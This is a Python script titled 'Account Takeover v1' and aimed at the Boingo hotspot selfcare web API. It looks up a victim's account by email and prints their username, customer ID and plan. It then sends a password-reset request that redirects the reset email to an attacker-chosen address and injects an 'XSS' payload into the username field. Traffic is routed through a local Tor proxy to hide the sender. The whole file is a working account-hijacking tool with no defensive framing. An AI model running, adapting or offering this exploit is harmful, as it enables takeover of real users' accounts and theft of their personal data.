#Author : Heriberto Ramirez
#Date : 08/22/2021
#Description : Account Takeover v1

import requests
import time
import os
#import sock
#import sockets
import json


def logo() :
    print('''
##############################
##############################
################ .############
#####/   ###########.  #######
#####/   ##########  ##  #####
#####/   ########( *#  #  ####
#####/          %#############
#####/   #####   (############
#####/   #####   /############
#####/          ##############
##############################
##############################
      BOINGO TAKEOVER
    ''')

def hideMe(stat) :
    #print('connecting to socket...')
    try :
        connection = socket.socket()
        connection.connect(('127.0.0.1', 9050))
        #socks.set_default_proxy(socks.SOCKS5, "127.0.0.1", 9150)
        #socket.socket = socks.socksocket
        stat['http'] = 'socks5h://localhost:9050'
        stat['https'] = 'socks5h://localhost:9050'
        #print('connected ;)\n')
        hidden = True
        return True
    except :
        #print('unable to connect to socket\n')
        time.sleep(3)
        os.system('cls')
        hidden = False
        return hidden

def search() :
    os.system('cls')

    logo()

    hidden = False

    session = requests.session()
    stat = session.proxies = {}


    searchEmail = input('Email Account (TakeOver) : ')
    print()
    #searchEmail = 'admin@gmail.com'  #testing purposes
    searchUrl = '''https://selfcare.boingohotspot.net/webapi/customer/2/search'''
    searchData = {"email":searchEmail}
    searchHeaders = {
        'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:91.0) Gecko/20100101 Firefox/91.0',
        'Accept-Language': 'en-US,en;q=0.5',
        'Accept-Encoding': 'gzip,deflate',
        'Content-Type': 'application/json',
        'X-Requested-With': 'XMLHttpRequest',
        'Origin': 'https://selfcare.boingohotspot.net',
        'Referer': 'https://selfcare.boingohotspot.net/accounthelp',
        'Sec-Fetch-Dest': 'empty',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Site': 'same-origin',
        'Te': 'trailers'
        }

    try :
        hidden = hideMe(stat)
    except :
        #print('no powers\n')
        stat = session.proxies = {}



    try:
        if hidden :
            #print('sending request with powers :) ...')
            resp = session.get(searchUrl, params=searchData, headers=searchHeaders)
        else :
            #print('no powers. continue ? \n1) Yes \n2) No')
            #check = input('choice : ')[0]
            check = '1'
            print()
            if check == '1' :
                #print('sending request as human :( ....')
                resp = session.get(searchUrl, params=searchData, headers=searchHeaders)
            elif check == '2' :
                #print('fix the socket then ... turn it on')
                time.sleep(2)
                os.system('cls')
                exit()
            else :
                print('restart the program, i am too tired to fix')
                exit()
    except :
        print('something went wrong with the request')
        exit()

    ####debug#####
    #print(resp.json())
    #print(resp.json()[5:13]) #user field
    #print(resp.json()[18:27]) #username
    #print(resp.json()[55:66]) #customer field
    #print(resp.json()[70:80]) #customer id
    #print(resp.json()[5:13])
    #print(resp.status_code)
    #print(resp.url)
    #print(resp.headers)
    ###############

    try :
        realData = json.loads(resp.json())
        username = realData['username']
        customerId = realData['customer_id']
        firstName = realData['first_name']
        lastName = realData['last_name']
        currency = realData['currency']
        planType = realData['plan_type']
    except :
        print('dunno')
        exit()

    if 'username' in realData :
        print('valid email')
        time.sleep(2)
        os.system('cls')
        print('Username :', username)
        print('Customer ID :', customerId)
        print('Currency Used :', currency)
        print('Plan Type :', planType)
        print()
        username = input(r'XSS to inject : ')
        reset(username,customerId,firstName,lastName,hidden,check,session)
    else :
        print('invalid email. try again')
        time.sleep(2)
        os.system('cls')
        search()


    #return resp


def sendOff(resetUrl, resetData, resetHeaders) :

    resp = requests.post(resetUrl, json=resetData, headers=resetHeaders)

    return resp


def reset(username,customerId,firstName,lastName,hidden,check,session) :


    sendToEmail = input('email to send takeover : ')
    print()

    resetUrl = 'https://selfcare.boingohotspot.net/webapi/customer/2/sendresetpasswordemail'

    resetHeaders = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:91.0) Gecko/20100101 Firefox/91.0',
        'Accept-Language': 'en-US,en;q=0.5',
        'Accept-Encoding': 'gzip,deflate',
        'Content-Type': 'application/json',
        'X-Requested-With': 'XMLHttpRequest',
        'Origin': 'https://selfcare.boingohotspot.net',
        'Referer': 'https://selfcare.boingohotspot.net/accounthelp',
        'Sec-Fetch-Dest': 'empty',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Site': 'same-origin',
        'Te': 'trailers'
    }

    resetData = {
        'link':'https://selfcare.boingohotspot.net/accounthelp',
        'email': sendToEmail,
        'customer_id': customerId,
        'username':username,
        'first_name':firstName,
        'last_name':lastName
                 }
    try:
        if hidden :
            print('sending request with powers :) ...')
            resp = session.post(resetUrl, json=resetData, headers=resetHeaders)
            if resp.status_code == 200 :
                print('check your email!')
            else :
                print('something went wrong')
                #print(resp.status_code)
                #print(resp.text)
                exit()

        else :

            if check == '1' :
                #print('sending request as human :( ....')
                #resp = requests.post(resetUrl, json=resetData, headers=resetHeaders)
                resp = sendOff(resetUrl,resetData,resetHeaders)
                #resp = session.post('https://httpbin.org/post', json=resetData, headers=resetHeaders)

                if resp.status_code == 200 :
                    print('check your email!')
                    #print(resp.status_code)
                    #print(resp.text)
                else:
                    print('something went wrong... trying again...')
                    sendOff(resetUrl, resetData, resetHeaders)
                    if resp.status_code == 200:
                        print('check your email!')
                    #print(resp.status_code)
                    #print(resp.text)
                    exit()

            elif check == '2' :
                print('fix the socket then ... turn it on')
                time.sleep(2)
                os.system('cls')
                exit()
            else :
                print('restart the program, i am too tired to fix')
                exit()
    except :
        print('something went wrong with the request\n')
        print('Error Report :')
        print(resp.status_code)
        print(resp.text)
        print('\nTry Again, their back end is funky')
        exit()


search()